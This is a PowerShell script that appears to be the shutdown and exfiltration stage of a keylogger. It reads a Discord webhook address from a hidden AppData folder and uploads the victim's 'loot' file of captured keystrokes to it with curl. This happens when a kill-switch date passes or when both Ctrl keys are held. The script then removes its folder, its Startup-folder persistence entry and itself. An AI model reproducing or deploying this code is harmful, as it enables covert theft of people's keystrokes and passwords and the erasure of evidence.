Add-Type -AssemblyName WindowsBase
Add-Type -AssemblyName PresentationCore,PresentationFramework

$Path="$env:appdata\-locker\$env:UserName-loot.txt"

$dc = (Get-Content "$env:appdata\-locker\wh.txt" -TotalCount 1)

function Upload-Discord {

[CmdletBinding()]
param (
    [parameter(Position=0,Mandatory=$False)]
    [string]$file,
    [parameter(Position=1,Mandatory=$False)]
    [string]$text 
)


$Body = @{
  'username' = $env:username
  'content' = $text
}

if (-not ([string]::IsNullOrEmpty($text))){
Invoke-RestMethod -ContentType 'Application/Json' -Uri $dc  -Method Post -Body ($Body | ConvertTo-Json)};

if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $dc}
}

while($true){
$Lctrl = [Windows.Input.Keyboard]::IsKeyDown([System.Windows.Input.Key]::'LeftCtrl')
$Rctrl = [Windows.Input.Keyboard]::IsKeyDown([System.Windows.Input.Key]::'RightCtrl')
if((Get-Content "$env:appdata\-locker\killswitch.txt") -ne $null -and ((get-date) -gt (Get-content "$env:appdata\-locker\killswitch.txt")) -or ($Rctrl -and $Lctrl)){
Upload-Discord -file $Path
sleep 5
Remove-Item "$env:appdata\-locker" -Recurse -Force;
Remove-Item "$env:userprofile\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\-p.cmd"
$done = New-Object -ComObject Wscript.Shell;$done.Popup("Keylogger Disabled",3)
Remove-Item "$env:appdata\-exit.ps1"
exit
}
else{continue}
}
